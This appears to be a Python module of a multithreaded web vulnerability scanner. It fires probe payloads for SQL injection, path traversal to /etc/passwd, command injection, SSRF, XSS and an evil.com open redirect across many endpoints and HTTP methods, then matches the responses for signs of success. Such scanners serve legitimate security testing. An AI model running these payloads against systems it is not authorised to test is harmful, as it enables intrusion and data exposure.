import requests, os
from urllib.parse import urljoin, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
from config import HTTP_HEADERS, DEFAULT_TIMEOUT, COMMON_ENDPOINTS, PARAMS as GLOBAL_PARAMS
from module.other import Other

class Top25FastScanner:
    METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH"]
    PAYLOAD = {
        "SQLi": "1' OR '1'='1",
        "LFI": "../../../../etc/passwd",
        "OpenRedirect": "https://evil.com",
        "RCE": "`id`",
        "SSRF": "http://127.0.0.1",
        "XSS": "<script>alert(1)</script>"
    }

    def __init__(self, args):
        self.PARAMS = GLOBAL_PARAMS
        self.target = f"http://{args.target}".rstrip("/")
        self.verbose = args.verbose
        self.thread = args.threads
        self.session = requests.Session()
        self.session.headers.update(HTTP_HEADERS)
        self.module_name = os.path.splitext(os.path.basename(__file__))[0]
        self.printer = Other()

    def scan(self):
        endpoints = open(COMMON_ENDPOINTS, "r").read().splitlines()
        tasks = []
        results = []
        colored_module = self.printer.color_text(self.module_name, "cyan")

        with ThreadPoolExecutor(max_workers=self.thread) as executor:
            for category, params in self.PARAMS.items():
                if category not in self.PAYLOAD:
                    continue
                payload = self.PAYLOAD[category]
                for param in params:
                    for endpoint in endpoints:
                        url = urljoin(self.target, endpoint)
                        for method in self.METHODS:
                            tasks.append(executor.submit(
                                self._scan_once, category, method, url, endpoint, param, payload
                            ))

            for future in as_completed(tasks):
                res = future.result()
                if res:
                    colored_cat = self.printer.color_text(res["category"], "yellow")
                    colored_method = self.printer.color_text(res["method"], "magenta")
                    colored_param = self.printer.color_text(f"[{res['param']}]", "green")
                    colored_status = self.printer.color_text(str(res["status"]), "green" if res["status"] == 200 else "red")
                    print(f"[*] [Module: {colored_module}] [Cat: {colored_cat}] [Method: {colored_method}] [Param: {colored_param}] [Status: {colored_status}]")
                    results.append(res)

        return {"target": self.target, "findings": results}

    def _scan_once(self, category, method, url, endpoint, param, value):
        try:
            data = {param: value}
            if method == "GET":
                full_url = f"{url}?{urlencode(data)}"
                r = self.session.get(full_url, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
            else:
                r = self.session.request(method, url, data=data, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
                full_url = url

            if r.status_code in [200, 201] and not any(bad in r.text.lower() for bad in ["not found", "error", "forbidden", "denied"]):
                indicators = {
                    "SQLi": ["mysql", "syntax", "sql", "query failed"],
                    "LFI": ["root:x:0:0", "/bin/bash"],
                    "OpenRedirect": ["evil.com"],
                    "RCE": ["uid=", "gid="],
                    "SSRF": ["localhost", "127.0.0.1"],
                    "XSS": ["<script>alert(1)</script>"]
                }
                signs = indicators.get(category, [])
                if any(s in r.text.lower() for s in signs):
                    return {
                        "category": category,
                        "method": method,
                        "endpoint": endpoint,
                        "param": param,
                        "payload": value,
                        "status": r.status_code
                    }
        except:
            return None

def scan(args=None):
    return Top25FastScanner(args).scan()
